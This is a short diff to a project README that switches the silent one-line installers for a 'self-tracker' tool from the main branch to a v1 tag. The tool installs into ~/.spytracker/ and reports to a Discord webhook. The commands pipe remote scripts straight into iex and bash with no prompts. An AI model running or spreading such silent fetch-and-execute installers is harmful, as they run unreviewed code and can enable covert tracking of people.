@@ -14,12 +14,12 @@ Pass your webhook URL as an argument - silent, no prompts, no confirmation.
 
 ```powershell
 # Windows (PowerShell)
-$u='https://discord.com/api/webhooks/...'; irm https://raw.githubusercontent.com/inf-nicolasperez/self-tracker/main/install.ps1 | iex
+$u='https://discord.com/api/webhooks/...'; irm https://raw.githubusercontent.com/inf-nicolasperez/self-tracker/v1/install.ps1 | iex
 ```
 
 ```bash
 # macOS (Terminal)
-curl -fsSL https://raw.githubusercontent.com/inf-nicolasperez/self-tracker/main/install.sh | bash -s 'https://discord.com/api/webhooks/...'
+curl -fsSL https://raw.githubusercontent.com/inf-nicolasperez/self-tracker/v1/install.sh | bash -s 'https://discord.com/api/webhooks/...'
 ```
 
 The installer downloads `tracker.py` to `~/.spytracker/`, saves the webhook
